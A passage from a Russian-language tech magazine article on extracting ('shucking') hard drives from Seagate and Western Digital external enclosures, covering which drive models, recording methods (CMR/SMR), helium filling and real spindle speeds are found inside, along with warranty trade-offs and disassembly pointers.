ненными обычным воздухом) и основанными на честной записи CMR, а ско‐
рость вращения шпин деля сос тавляла 5400 обо ротов в минуту. В моделях
емкостью от 8 Тб и выше также использовался способ записи CMR, но кор‐
пуса дисков уже были наполнены гелием, а скорость вращения шпинделя
составляла 7200 RPM (сбивает с толку надпись «класс производительнос‐
ти 5400 RPM», которая не имеет отношения к скорос ти вращения шпинделя,
но является своеобразной оценкой производитель ности диска и еще одним
способом подороже продать то же самое с дру гой этикеткой). Сей час же
в микс добавились модели с SMR (на 2 и 6 Тб, мне лично такой уже успел
попасться) и атмосферные модели на 8 Тб — горячие и шумные по срав‐
нению с наполненными гелием аналога ми.
  Ситуация с внешними накопителями Seagate также стала неод нозначной.
Не так давно все знали, что внешние Seagate независимо от объема пос‐
тавляются с черепич ной записью SMR. Из‐за отсутс твия под держки команды
trim скорость повторной записи на такие диски резко падала сразу после
первого заполнения буферной зоны. Покупать с целью извлечения диска
модели от Seagate не сто ило — разница в цене по сравнению с аналогами
от WD лишала эту затею вся кого смысла. Но сегодня в миксе присутс твуют
как минимум две модели объемом 10 Тб, внут ри которых — отличный напол‐
ненный гелием накопитель с CMR и скоростью вращения шпинделя 7200
RPM, скоростной потенциал которого уду шает откровенно недорогой кон‐
троллер USB (подробнее об этом я расскажу в соответствующем разделе).
Извлечение такого диска поз волит раскрыть его потенциал. Я проделал эту
процедуру и снял графики про изво дительнос ти в HD Tune, наглядно демонс‐
трирующие тротлинг на уровне контроллера USB.


КТО ПРОИЗВОДИТЕЛЬ?
Основных производите лей жестких дисков осталось три — это Seagate, Toshi‐
ba и Western Digital. При этом мас совые предложения в потребительском сег‐
менте есть лишь у Seagate и WD; найти диск Toshiba при желании можно,
но смысла в этом немного. А вот внешние накопители предлагают как оба
крупных производителя, так и великое мно жес тво мелких. Такие компании,
как Transcend, Verbatim, Intenso, и куча региональ ных брендов покупают жес‐
ткие диски у одного из производителей, вставляют их во внешний корпус
и продают с собственной гарантией и сервисным обслу живанием. А вот
в случае с производителями первой линии гарантийное и сервисное обслу‐
живание будет осуществлять тот бренд, который этот диск сде лал.
  Первый из них — компания Western Digital, которая продает внешние
накопители под марками WD и «премиальным» брендом G‐Drive. Внутри таких
накопителей — жесткие диски WD или HGST (Hitachi), которая с 2012 года
является частью концерна Western  Digital. К слову, получить диск HGST
покупатели внешних накопителей считают удачей. Как правило, перемар‐
кированные диски HGST с гелиевым наполнением устанавливают в модели
WD My Book и WD Elements объемом от 8 Тб. В накопители меньшего объема
устанавливаются диски производс тва самой WD. Впрочем, если ты не жела‐
ешь  играть  в лотерею, а хочешь  купить настоящий HGST без суеты
с перемаркиров кой — производитель с удовольствием пойдет навстречу:
в модели WD_BLACK D10 объемом 8 и 12 Тб встроены как раз диски серии
Ultrastar.
  Ближайший конкурент Western Digital — компания Seagate, которая также
предлагает накопители как под собственной торговой маркой, так и под «пре‐
миальным» лейблом LaCie. И если с накопителями Seagate все однозначно (а
какие еще диски ты ожидал там увидеть?), то к LaCie есть вопросы.
   Когда‐то давно LaCie была независимой компани ей. Внешние накопители
LaCie могли содержать практичес ки что угодно  (в разобранной нашей
лабораторией модели был диск от Hitachi, который теперь стал частью WD).
В 2014 году LaCie была куплена Seagate, и теперь все внешние накопители
LaCie комплектуются (или должны ком плектоваться) исключительно дисками
от Seagate. Отличительные особенности накопителей линейки LaCie —
интерфейс Thunderbolt и симметричный порт USB Type‐C. В многодисковых
моделях внешних накопителей LaCie устанавлива ют диски Seagate Ironwolf
Pro; однодисковые модели LaCie и Seagate комплектуются дисками серии
Seagate Barracuda.


Историческая справка
Тебе показалось, что разнообразие дисков, которые WD и Seagate устанав‐
ливают в свои внешние накопители, чрезмерно? Всего несколько лет назад
было намного хуже. У нас в офисе есть небольшой склад старых накопителей,
емкость которых колеблется от 60 до 320 гигабайт. Исследовательское
любопытство побудило нас разобрать корпуса накопителей перед тем,
как утилизировать диски. В накопителе LaCie 60GB оказался диск от Hitachi,
а в трех одинаковых WD 320GB — диски WD, Toshiba и Fujitsu соответс твенно.



WD ИЛИ SEAGATE?
Итак, с производителями разоб рались. Линейки G‐Drive и LaCie из рассмот‐
рения исклю чим: покупать внешние накопи тели под этими марками для того
лишь, чтобы извлечь из них диски, не лучшая идея с точки зре ния цены. А вот
с внешними дисками WD и Seagate затея не лишена смысла.
   Так что же выбрать, Seagate или Western Digital? Если отвлечься от личных
предпочтений и репутации производителей (у каждого из которых были свои
удачные и неудачные модели), можно увидеть, что внутренняя начинка их
внешних накопителей различается кардиналь но. Начнем  в алфавитном
порядке.


             INFO

                      У каждого произво дителя существуют вариации
                       одних и тех же накопителей, которые продаются
                      под разными именами. Например, эксклюзивные
                      и юбилейные редак ции, доступные в корпусах
                       другой формы или предназначенные для реали‐
                      зации через конкретную сеть магазинов. У Sea‐
                         gate таким эксклюзивным партнером является
                      Amazon, у Western Digital — аме риканский Best
                         Buy, для которого под маркой WD Easystore пос‐
                        тавляются перемаркированные накопители WD
                        Elements Desktop.



ВНЕШНИЕ ДИСКИ SEAGATE
Компания предлагает две основные линейки внешних накопителей типораз‐
мера 3,5 дюйма: модели Seagate Expansion Desktop и Backup Plus Hub.





                      Seagate Expansion Desktop





                       Seagate Backup Plus Hub

Отличаются линейки формой корпусов, набором возможностей (у Backup
Plus Hub встроен хаб USB на два порта), а также в некоторых странах —
дополнительными плюшками, в числе которых двухмесячная подписка на сер‐
висы Adobe Creative Cloud. При этом внутри устройств аналогичной емкости
устанавливаются жесткие диски идентичных моделей. Если тебе не нужна
подписка на Adobe CC, а от корпуса ты пла нируешь сразу избавиться — име‐
ет смысл покупать менее дорогой вариант.


Что внутри?
Какое‐то время назад попадались модели Seagate Desktop, но сейчас
во внешние накопители линеек Expansion Desktop и Backup Plus Hub чаще
всего попадают диски серий Seagate Archive либо Seagate Barracuda. Пос‐
ледние бывают двух видов: Barracuda Compute (до 8 Тб включительно; 5900
RPM, атмосферные, с черепичной записью SMR) и Barracuda Pro (пока
в качестве внешних накопителей дос тупны толь ко модели на 10 Тб; гелий,
7200 RPM, способ записи — CMR).
  К примеру, в модели емкостью 6 Тб, как пра вило, устанавливается один
из  двух  накопителей — ST6000AS0002 или ST6000DM004. В модель
емкостью 8 Тб часто устанавлива ют дис ки ST8000AS0002 или ST8000DM004.
Так, в полученной в марте 2020‐го модели Seagate Expansion Desktop 8TB
был установлен диск Barracuda Compute ST8000DM004‐2CX1, горячий и шум‐
ный.





  Пользователь Reddit разобрал три модели на 8 Тб, получив два диска
  Seagate Archive и один — Seagate Barracuda Compute

Приобретая внешний накопитель, нужно чет ко понимать, на чем именно эко‐
номит Seagate. Если в дисках линейки Ironwolf используется чес тная пер‐
пендикулярная запись (CMR), то модели  Archive и Barracuda Compute,
которые устанавливают в модели емкостью до 8 Тб включительно, используют
черепичный метод записи SMR (Shingled Magnetic Recording).

Что такое черепичная запись?
Не так давно мы опубликовали подробное исследова ние — статью «Сры ваем
покровы. Черепичная запись SMR в накопителях WD и Seagate». Не буду пов‐
торяться, приведу лишь вывод касательно Seagate. В дис ках с SMR про‐
изводства Seagate страдает скорость повторной записи после того, как ты
единожды заполнишь диск данными. Запись ведется в быстрый буфер CMR,
объем которого ограничен. После того, как буфер будет запол нен, начина‐
ется циклический про цесс уплотнения — переноса данных из буфера
в области черепичной записи. Этот процесс настоль ко медленный, что сред‐
няя скорость записи пада ет до 30 Мб/с, времена ми проседая до 10 Мб/с.
В качестве кандидатов на «пот рошение» диски Seagate с SMR (на сегод‐
няшний день — модели до 8 Тб включительно) я рекомендовать не могу.


Итак, с внешними дисками Seagate серий Expansion Desktop и Backup Plus
Hub объемами до 8 Тб включительно мы разоб рались. Если бы я писал эту
статью год‐полтора назад, я пос тавил бы здесь большую жирную точку, заб‐
раковав внешние накопители Seagate в качес тве доноров жестких дисков.
Однако с тех пор кое‐что изменилось: в попытке угнаться за основным кон‐
курентом, в арсенале которого есть внешние дис ки на 10, 12 и 14 Тб, в Sea‐
gate приняли решение выпустить на рынок 10‐терабай тный внешний диск.
В свете заметного отста вания от WD в плане емких внешних накопителей
в Seagate решили отло жить раз работку удешевленной модели диска на 10 Тб
с SMR. Чтобы побыстрее выйти на рынок, компания решила использовать то,
что было на текущий момент. А была линей ка из трех 10‐терабай тных накопи‐
телей Seagate Barracuda Pro, Ironwolf и Skyhawk. В результате внутрь моделей
Seagate Expansion Desktop 10TB и Backup Plus Hub 10TB попал отличный
по всем параметрам диск Barracuda Pro 10TB модели ST10000DM0004.





                       Источник: Reddit

Я приобрел накопитель Backup Plus Hub 10TB и протестировал его в HD Tune.
Результат получился интерес ный.





Как видишь, встроенный в накопитель дешевый контроллер USB не справ‐
ляется с потоком данных, огра ничивая максималь ную скорость переда‐
чи 175 Мб/с. Извле каем диск, вставляем в качес твенный корпус (QNAP TR‐
002).





Теперь мы наблюдаем более привычный график с максимальной скоростью
чтения на внешних дорожках в 225 Мб/с.
  Я нахожу диски Barracuda Pro 10TB весь ма удачными: тихие как в прос тое,
так и в процессе случайного чтения/записи, быс трые и достаточно холодные
(особенно в сравнении с моделями на 6 и 8 Тб) накопители однозначно стоят
своих денег.
  Интересный момент: у Seagate под одним и тем же названием и даже
с одним и тем же идентификатором модели продаются совершенно раз ные
диски. Меняется суффикс модели (то, что Seagate называет part number),
меняются и характеристики. Так, во внешних накопителях Backup Plus Hub
мне попадались диски ST10000DM0004‐1ZC101 и ST10000DM0004‐2GR11L,
у которых различается как скорость работы (в поль зу второго), так и набор
параметров S.M.A.R.T. (первый, более старый, отоб ражает такие параметры,
как G‐Sense Error Rate, в то время как из диагностики второго этот и многие
другие параметры убра ли). Формат данных у S.M.A.R.T. в новой модели также
отличается (например, ста рая модель выда ет количес тво часов работы,
похоже, в секундах, а новая — в часах). Кро ме того, новый вариант демонс‐
трировал меньший уровень вибраций — впрочем, это может объясняться
и просто разбросом параметров. Но вот такую раз ницу в графиках произво‐
дительности никаким разбросом парамет ров уже не объяснить.





                     ST10000DM0004‐1ZC101





                     ST10000DM0004‐2GR11L


Финансовый вопрос
Выгода налицо. Диск Seagate Barracuda Pro 10TB отдельно стоит поряд‐
ка 290 евро. Накопитель Seagate Backup Plus Hub 10TB, внутри которого
находится точно такой же диск, продают за 190 евро. Экономия? Однознач‐
но — экономия, но для некоторых — еще и способ сде лать весьма сом‐
нительный бизнес. Десятки продавцов на Amazon и eBay предлагают дис ки
ST10000DM0004 по весь ма привлекательной цене. Соблазнившиеся низ кой
ценой покупатели получают совершенно новый диск в OEM‐упаковке, однако
проверка гарантийных обязательств на сайте Seagate по серийному номеру
выдает отказ в обслужива нии: диск предназна чен для продажи в составе
внешнего накопителя. Ушлые бизнесмены прос то разобрали партию внешних
накопителей, извлек ли из них диски и решили подзаработать. В отдельных
случаях  покупателям  уда валось вернуть  такие дис ки продавцу,  а  вот
на исполне ние ими гарантийных обязательств я бы особо не рассчитывал.
   Единственный аргумент в пользу покупки диска отдельно — гарантийные
обязательства. Seagate предлага ет пятилетнюю гарантию на диск отдельно
и всего два года — на диск в корпусе. Стоят ли 30 % экономии лишних трех
лет гарантии, решать тебе.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

      ГОЛЫЕ ДИСКИ
                         СМОТРИМ, ЧТО ВНУТРИ
              У ВНЕШНИХ НАКОПИТЕЛЕЙ WD И SEAGATE





Зачем разбирать
Есть ли рациональные причины раз бирать внешние накопители Seagate,
извлекая из них диски? Ответ положительный, даже если забыть о раз нице
в стоимости между диском в корпусе и диском отдель но.
  Корпуса Seagate пло хо спроектирова ны. В них практичес ки отсутствует
вентиляция: единственные отверстия находятся в нижней части корпуса
(сотовая структура, которую ты видишь на верхней крышке Seagate Backup
Plus Hub — декорация; на самом деле крышка  глухая). В результате
атмосферные модели дисков (особенно модели на 6 и 8 Тб) быстро перег‐
реваются; в процессе длительной записи (а запись на диск с SMR будет
очень длительной) мне довелось увидеть цифру 61 градус. Такие температу‐
ры не полезны для дисков.
   Seagate исполь зует самые дешевые контроллеры USB, ограничивающие
скорость передачи данных. Я привел сравнитель ные графики скоростей
одного и того же диска на 10 Тб в корпусе от Seagate и пос ле извле чения —
в другом внешнем кор пусе. Раз ница налицо.
  Наконец, в прошивках USB‐контроллеров Seagate моделей Backup Plus
есть ошибки, приводящие к тому, что в Linux отклю чаются некоторые функции
(в частности, функционал UAS — USB Attached SCSI), что еще сильнее сни‐
жает производительность. Подробности — в этом посте на Reddit. Даже если
ты не сидишь на Linux, ты можешь захотеть использовать накопитель в качес‐
тве резервного диска для NAS, в котором почти наверняка будет Linux.
По некоторым данным, в модели Seagate Backup Plus Hub описанные ошибки
исправлены, но в ядре Linux работа UAS по‐прежнему на всякий случай бло‐
кируется.


Почему этого делать не стоит
О чем следует подумать перед тем, как браться за отвертку?
  Разобрав диск, ты автоматически лишаешь ся гарантии. И если диски WD
Elements Desktop или WD My Book можно разобрать и собрать обратно
без повреждений (WD дос таточно либерально относится к таким сценариям,
не отказывая, как правило, в гарантийном обслуживании), то корпуса Sea‐
gate — решительно одно разовые: в процессе разборки пластиковые защел ки
обычно ломаются. Вероятнее всего, корпуса были сознательно спроекти‐
рованы таким образом. В случае возникно вения гарантийной ситуации вста‐
вить диск обратно и сделать вид, что «ничего не было», у тебя, скорее все го,
не получится. Никаких дру гих аргу ментов против разборки внешних накопи‐
телей Seagate у меня нет.


Как разобрать
В сети более чем достаточно инс трукций, демонстрирующих процесс раз‐
борки и извлечения дисков из внешних накопителей. Вот инструкция для Sea‐
gate Expansion Desktop.





А вот — для Seagate Backup Plus Hub.





При желании ты легко найдешь десяток‐другой аль тернативных инструкций,
в том числе от русскоязычных пользователей. Я нашел полезной инструкцию
от юзера iFixIt и инструкцию с сайта mattgadient.com.


ВНЕШНИЕ ДИСКИ WESTERN DIGITAL
Компания Western Digital предлагает нес колько линеек внешних накопителей
в форм‐фак торе 3,5 дюйма. Сюда входят модели WD Elements Desktop, WD
My Book, WD My Book DUO и WD_BLACK D10. Пожалуй, стоит разложить их
по полочкам, но для начала приведу краткую выжимку.


WD Elements Desktop
 • Гарантия: 2 года
 • Гарантия распространяется: на весь накопитель в сборе
 • Что внутри: в основном диски White Label (EMAZ)
 • Встроенное шифрование: нет
 • Доступ к уже записанным данным пос ле извлечения из корпуса: да
 • Сложность вскрытия корпуса: средняя
 • Цена в расчете на терабайт емкости: самая низ кая среди прочих вари‐
   антов
 • Особенности: возможны проб лемы с сигнальным коннектором на 3,3 В


WD My Book
 • Гарантия: 3 года
 • Гарантия распространяется: на весь накопитель в сборе
 • Что внутри: в основном диски White Label (EZAZ)
 • Встроенное шифрование: да, на уровне диска (SED)
 • Доступ к уже записанным данным пос ле извлечения из корпуса: да, если
   пароль не установлен; нет, если пароль уста новлен
 • Сложность вскрытия корпуса: средняя
 • Цена в расчете на терабайт емкости: чуть выше Elements, но ниже WD My
  Book Duo
 • Особенности: возможны проб лемы с сигнальным коннектором на 3,3 В


WD My Book Duo
 • Гарантия: 3 года
 • Гарантия распространяется: на каждый диск по отдельности, нет отличий
   от гарантии на диски WD Red, приобретаемые отдельно
 • Что внутри: два диска WD Red. Обра ти внимание: в накопи теле WD My
  Book Duo 12TB будет уста новлено два диска по 6 Тб.
 • Встроенное шифрование: да, на уровне контроллера USB; пароль уста‐
   навливается толь ко в режимах RAID 0 и 1 (но не JBOD); нес мотря на это,
   сквозное шифрование записываемых данных активно всегда.
 • Доступ к уже записанным данным пос ле извлечения из корпуса: нет (но
  можно использовать дру гой корпус той же модели). Пос ле извлечения
   дисков из корпуса My Book Duo считать с них ранее записанные данные
   напрямую (или в кор пусе другой модели) не удастся. В другом корпусе WD
  My Book Duo той же модели доступ к данным в штатном режиме.
 • Сложность вскрытия корпуса: низкая, диски легко извле каются штатным
   образом.
 • Цена в расчете на терабайт емкости: чуть выше WD My Book
 • Особенности: см. ремарки по шифрованию данных.


WD_BLACK D10
 • Гарантия: 3 года
 • Гарантия распространяется: на весь накопитель в сборе
 • Что внутри: настоящие, не перемаркированные диски Ultrastar DC 8Тб
   (атмосферный) или 12Тб (наполненный гелием)
 • Встроенное шифрование: нет
 • Доступ к уже записанным данным пос ле извлечения из корпуса: да
 • Сложность вскрытия корпуса: повышенная
 • Цена в расчете на терабайт емкости: самая высокая среди прочих вари‐
   антов, но нам ного ниже стоимости дисков Ultrastar DC отдельно
 • Особенности: достаточно шумные диски. А нужно ли разбирать? Хорошие
   корпуса, высокая производитель ность, активное охлаждение.


WD Elements Desktop
WD Elements Desktop, также извес тная под названием WD Easystore (эксклю‐
зив сети магазинов Best Buy), занимает в линейке внешних накопителей WD
начальный уровень. В дос тоинс тва модели можно записать удачную конс трук‐
цию корпуса (удачную — с той точки зрения, что с миниму мом осторожности
его можно разобрать без повреждений) и удачный контрол лер USB, не огра‐
ничивающий ско рость работы диска и не навязывающий пользователю шиф‐
рование. Внешними дисками Elements Desktop можно пользоваться «как
есть»: в компании проделали хорошую работу по шумо‐ и виброизоляции
и охлаждению диска, предусмотрев вентиляционные решетки в верхней
и нижней части накопителя.
  В последние годы в модели Elements Desktop устанавливаются исклю‐
чительно диски WD White Label (рань ше в них можно было обнаружить как WD
Blue в моделях до 6 Тб, так и WD Red в моделях на 8 Тб). В моделях до 6 Тб
вклю чительно ты гарантированно получа ешь атмосферный диск со скоростью
вращения  шпинделя  5400  обо ротов  в  минуту.  Так,  в  накопи теле
емкостью 4 Тб я обнаружил диск WD40EMRX‐82UZONO (White Label, CMR).





                    WD40EMRX‐82UZONO

Особняком стоит модель на 6 Тб. Еще в прош лом году в них устанавливались
модели с CMR, но в купленных весной этого года накопителях обнаружились
диски WD60EMAZ (White Label, черепичная запись SMR с поддержкой коман‐
ды trim). Такие диски мож но использовать по отдель нос ти, но в состав RAID‐
массива я бы вклю чать их не стал.
  Наконец, модели емкостью 8 Тб и выше поставляются с наполненными
гелием дисками с CMR и скоростью вра щения шпинделя 7200 RPM (при этом
указывается так называемый «класс производитель ности» 5400 RPM Class,
что говорит скорее о желании Western Digital сег ментировать продажи, чем
о реальной скорости вра щения шпинделя). Все такие модели — аппаратные
копии моделей HGST / Western Digital Ultrastar DC раз ных поколений.
  Диски WD до 6 Тб включительно — холодные и малошумные. В целом они
не подвержены вибрациям. А вот диски объемом 8 Тб (модели WD80EMAZ
свежих ревизий) бесшумны сами по себе, но могут неприятно вибрировать.
Контроль качества Western Digital в отношении дис ков, которые устанавлива‐
ются во внешние накопители, оставляет желать лучшего: мне попадались
как экземпляры с низким, практичес ки незаметным уровнем вибрации, так
и вибрирующие доволь но сильно.


Гарантия
Обрати вни мание: в отличие от дисков Seagate, в которые устанавливают
самые обычные жесткие диски извес тных моделей, Western Digital в однодис‐
ковых накопителях использует модели White Label, име ющие свои собствен‐
ные идентификаторы. По гарантии такие диски обслу живаются только в сос‐
таве накопителя. В то же время двухдисковые модели WD My Book DUO пос‐
тавляются с парой дисков WD Red, на которые действует трехлетняя гаран‐
тия, распространяющаяся как на корпус, так и на каждый из двух дисков
по отдельности.


Еще совсем недавно на этом можно было бы и закончить, но Western Digital
продолжает удивлять пользователей. Так, один из пользователей Reddit, рас‐
считывающий получить проверенную временем напол ненную гелием модель
WD80EMAZ, получил все тот же диск WD80EMAZ, но — атмосферный.





Как оказалось, данная модель — представитель нового поколения дис ков,
основанного на платформе Ultrastar DC HC320.





Максимальный на сегодня объем WD Elements Desktop — 14 Тб. Внутри — та‐
кой диск. Фактически в накопителе уста новлен перемаркированный WD Ultra‐
star DC HC530 7200‐RPM SATA производства HGST. Надпись FCC Regulatory
Approval Number US7SAP140 на этикетке позволя ет однозначно идентифици‐
ровать данную модель как HGST Ultrastar DC HC530.


Как разобрать
Вскрыть корпус WD Elements относительно нес ложно. Для этого нужно отжать
пластиковые защелки, рас положенные в верхней и нижней час тях корпуса,
после чего аккуратно сдвинуть защитный кожух. При минимальной осторож‐
ности это можно проделать без повреждений. Инс трукция — на видео.





WD My Book
Накопители WD My Book занимают следующую ступень в иерархии внешних
дисков Western Digital. От моделей Elements Desktop они отличаются формой
корпуса, отсутствием светодиодного индикатора и присутствием встроенно‐
го (по всей вероятности — в сам диск) шифрования AES‐256.
   Согласно информации WD External Drive Hardware Encryption Compatibility
Matrix, данные с дисков, извлеченных из WD My Book, можно считать и без
корпуса (при условии, что пароль не установлен). А это заставляет пред‐
положить, что шифрование здесь реали зова но не средствами контроллера
USB, как это сде лано в двухдисковых моделях, а на уровне самого накопи теля
посредством механизма SED.
   Есть ли разница в произво дительнос ти меж ду дис ками моделей EMAZ (WD
Elements Desktop) и EZAZ (WD My Book)? Пользователи утверждают, что раз‐
ница если и есть, то минимальная.





                       Источник: Reddit

В остальном отличий от моделей Elements мало. Дру гая форма корпуса, нес‐
колько иной (некоторые утвержда ют, что даже более простой) способ раз‐
борки, трехлетняя гарантия, отсутствие светодиодного инди катора и встро‐
енное шифрование (веро ятно, SED) — вот и вся разница. Внутри My Book
устанавливаются уже привычные диски White Label, являющиеся аппаратными
копиями соответствующих моделей WD Blue либо Ultrastar DC.


Как разобрать
Вскрыть корпус WD My Book довольно прос то. Для этого достаточно отжать
пластиковые защелки, рас положенные в нижней час ти накопителя. Многие
видеоинструкции предлагают отжать защел ки и в верхней части корпуса,
однако в этом нет необ ходимос ти. Обра ти внимание: после того, как защел ки
будут отжаты, внутренняя часть накопителя может неожиданно выскользнуть
из корпуса, так что стоит заранее подстелить на стол что‐нибудь мягкое. Вот
инструкция.





WD My Book Duo
Двухдисковые модели WD My Book Duo интересны тем, что позволяют штат‐
ным образом извлекать и заменять дис ки, в роли которых выступают хорошо
известные модели WD Red. Гарантийные обязательства Western Digital рас‐
пространяются как на устройство в сборе, так и на каждый из дисков
по отдельности (обрати внимание: полити ка магазина может отличаться,
поэтому лучше сразу после покуп ки зарегистрировать устройство на сайте
WD и проверить правильность оформления гарантийных обязательств).
   Двухдисковые модели WD My Book Duo час то пред лагаются по цене,
которая ниже стоимости двух дисков WD Red по отдельности. С учетом трех‐
летней гарантии, позволяющей заменить любой из двух дис ков, покупка My
Book Duo — самый безопас ный способ получить пару накопителей WD Red.
   Если же ты планируешь использовать диски в составе корпуса, имей
в виду: в контроллере USB использует ся неот клю чаемое шифрование дан‐
ных. Даже если ты не уста новишь пароль, все записанные на устройство дан‐
ные будут зашифрованы и считать их удастся только в аналогичном корпусе
(кстати, изначальная емкость устройства значения не имеет: к при меру, кор‐
пуса от WD My Book Duo 12TB прекрасно работают с дисками, извлеченными
из WD My Book Duo 16TB, и наобо рот). Впро чем, если ты собираешься уста‐
новить диск в NAS, то данные с него так или иначе будут потеряны в процессе
инициализации массива.


                                     Продолжение статьи →
ТРЮКИ               ← НАЧАЛО СТАТЬИ

      ГОЛЫЕ ДИСКИ
                         СМОТРИМ, ЧТО ВНУТРИ
              У ВНЕШНИХ НАКОПИТЕЛЕЙ WD И SEAGATE





WD_BLACK D10
Накопители линейки WD_BLACK D10 вызывают у меня сме шанные чувства.
С одной стороны, они функциональны, используют активное охлаждение
(небольшой и тихий вентилятор), наконец — просто красивы; разбирать их
жал ко. С другой — внутри установлены диски Ultrastar DC HC320, отли‐
чающиеся высокой скоростью и надеж ностью (но и сравнительно высоким
уровнем шума). С третьей, модель на 8 Тб — атмосферная, то есть срав‐
нительно шумная и горячая; наполненные гелием аналоги из WD Elements
и My Book выглядят интереснее, а сто ят — дешевле.
   Каких‐то специфических особенностей у данных накопителях нет, разве
что можно пожало ваться на давно устаревший разъем USB 3.0 micro‐B вмес‐
то симметричного Type‐C, который выглядит более логичным для накопи теля
такого класса. Шифрование отсутс твует.


Как разобрать
Процесс разборки сложнее, чем кажется: помимо винтов верхнюю крышку
удерживают и пластиковые защелки, отжать которые, не повредив, будет чуть
сложнее, чем в ранее рассмотренных моделях.
  Накопители достаточно новые, инструкций по разборке пока немного.
Самая, пожалуй, вменяемая на сегодняшний день инс трукция — на немецком
языке.


ГЕЛИЙ ИЛИ «ЧЕРЕПИЦА»?
Теперь мы имеем представление, какие именно диски устанавливают про‐
изводители  во  внешние  накопители.  Единс твенные  модели,  которые
не вызывают вопросов — это атмосферные диски с числом оборотов шпин‐
деля 5400 RPM и методом записи CMR. Одна ко именно такие диски Seagate
не устанавливает в свои накопители совсем, а Western Digital пос тепенно
выводит из обращения, заменяя младшие модели дис ками с черепичной
записью SMR.
  При этом обе компании уста навливают во внеш ние накопители и диски,
наполненные гелием. У Western Digital это все модели от 10 Тб и выше, а так‐
же   (на   сегодняшний   день)  подавляющее  большинство  моделей
емкостью 8 Тб. У Seagate гелий начина ется от 10 Тб.
  Наполнение гелием дает целый ряд преимуществ (тише работа, ниже
энергопотребле ние, можно уста новить больше плас тин и так далее), однако
некоторые пользователи до сих пор подоз ревают, что гелий вот‐вот про‐
сочится через металлическую решетку и утечет в атмосфе ру. С учетом того,
что первые гелиевые диски появились не так давно, однозначно опровер‐
гнуть такие подозрения нельзя. Так какое же зло предпочесть — гелий
или «черепицу»?
   Если говорить о дисках Seagate, то думать особо не о чем: выбор идет
между самыми дешевыми (в пло хом смысле слова) моделя ми компании
емкостью до 8 Тб включительно и одними из самых технически прод винутых
(10 Тб и недавно представленные 12 и 14 Тб). Это совершенно разные
линейки продуктов, между которыми — пропасть.
  В случае с Western Digital дела обстоят несколько сложнее. Атмосферные
диски WD емкостью до 6 Тб включитель но практичес ки не слышны в работе,
а их энергопотребле ние и, как следс твие, наг рев — рекордно низки. Если
говорить о модели на 6 Тб, то пришедшая на смену CMR‐диску модель с SMR
работает еще тише, а греется еще меньше. При этом благодаря поддержке
команды trim большой разницы в скорос ти работы между дисками с CMR
и SMR ты не увидишь, если не попытаешься уста новить такой диск в RAID
5 или использовать с ZFS.
  Диски на 8 Тб (если тебе попадется гелий) и модели на 10–14 Тб вра‐
щаются со скоростью 7200 обо ротов в минуту. По спецификациям такие дис‐
ки имеют право быть дос таточно шум ными, но на практике многие поль‐
зователи сталкиваются не с шумом мотора, а с гулом, выз ванным передачей
вибрации накопителя на поверхность, на которой он установлен. В случае
с единственным диском от этого гула можно попытаться избавиться, но два
«гелиевых» диска, установленных в обычный двухдисковый NAS, будут виб‐
рировать сильнее, чем два диска со скоростью 5400 оборотов в минуту.


КОГДА 5400 = 7200
А почему, собственно, я утверждаю, что гелиевые дис ки WD вращаются
со скоростью 7200 RPM? Ведь в спецификациях черным по белому написа‐
но 5400 RPM! Здесь мы наблюдаем забавный при мер реверс‐маркетинга,
когда компания пытается занизить один из клю чевых параметров диска
для того, чтобы продавать ту же самую механику (возможно, прошедшую
более тщательный контроль качес тва и работающую под управле нием другой
прошивки или даже с дру гим контроллером) дороже под маркой WD Red Pro
или Ultrastar DC.
  Один распространенный миф отно сительно моделей WD с гелиевым
наполнением основывается на маркировке дисков и информации, которую
выдает S.M.A.R.T. Многие пользователи считают, что модели дисков WD White
Label — это перемаркированные диски HGST, скорость вращения шпинделя
которых снижена с 7200 до 5400 обо ротов в минуту. Честно говоря, мне труд‐
но предположить, что можно просто так взять и сни зить скорость вращения
шпинделя диска без кардинальной перера бот ки его компонентов; более
того, я пока не встречал вживую ни одного напол ненного гелием диска с нас‐
только низкой скоростью. Но  S.M.A.R.T. утвержда ет другое. Посмотрим
на скриншот, описывающий характеристики модели WD Red, установленной
в накопителе WD My Book Duo.





Казалось бы, все очевидно: скорость вра щения шпинделя — 5400 оборотов
в минуту. О чем тут думать? Если не веришь, можно пойти на сайт WD и пос‐
мотреть характеристики.





Черным по белому, «скорость вращения — 5400 оборотов в минуту».
Для самых недоверчивых есть официальные спецификации.





Ведь 5400 же? Почти. Следи за руками. В официаль ных спе цификациях нет
ни слова о скорости вращения шпинделя. Есть понятие «класс произво‐
дительности», который заявлен как «5400 RPM Class». Так вот: абсолютно все
жесткие диски, напол ненные гелием  (а это — большинс тво доступных
моделей емкостью 8 Тб и выше) вращаются со скоростью 7200 оборотов
в минуту. Оборотов — 7200, а класс произво дительности — 5400 RPM.
Не перепутай.
  Почему же WD занижает характеристики, ука зывая 5400 RPM Class в спе‐
цификациях и лжет в лицо на стра нице продукта, заявив цифру 5400 в качес‐
тве скорости вращения шпинделя? Эта маленькая маркетинговая ложь поз‐
воляет производите лю сегментировать рынок, направляя желающих получить
более высокую производительность покупателей в сторону дорогих линеек
WD Red Pro или еще более дорогих серверных дисков HGST. На самом же
деле класс производительнос ти 5400 RPM Class вклю чает как модели со ско‐
ростью вращения шпинделя 5400 оборотов в минуту (все «воздушные»
модели до 6 Тб включительно и редкие «воз душные» модели на 8 Тб), так
и 7200 RPM (все модели от 8 Тб и выше, наполненные гелием).
  Логичный вопрос: почему ты должен поверить мне, а не кол лективному
бессознательному, постингам Reddit, информации из S.M.A.R.T. и данным,
опубликованным на странице продукта? Верить на слово совершенно не обя‐
зательно, ты можешь легко и прос то измерить скорость вращения шпинделя
самостоятельно. Для этого дос таточно любого телефона с Android и бесплат‐
ной программы Spectroid.
  Измерение провести дос таточно прос то. Запус ти приложение и поднеси
телефон к запущенному накопителю. При ложение проанализирует звуковой
спектр и выдаст информа цию о том, на какой час тоте или час тотах зарегис‐
трирован пик.





Как видим, у модели WD Red 8TB пик зарегис трирован на частоте 120 Гц.
Умножаем 120 на 60 и получаем частоту 7200 Гц, которая совпадает с числом
оборотов шпинделя.


        WWW

                  •Дополнительная информация: HDD spin‐up fre‐
                         quency plots reveal if a drive is 5400 rpm or 7200
                       rpm



ЗАГАДОЧНЫЕ ДИСКИ WD WHITE LABEL
В сети ходит масса слухов отно ситель но того, чем на самом деле являются
диски Western  Digital с этикетками белого цвета, которые устанавливают
во внешние накопители. И если с атмосферными моделями все более
или менее понятно (это — аппа ратные кло ны моделей WD Blue соответству‐
ющей емкости), то с наполненными гелием дисками дела обстоят нес колько
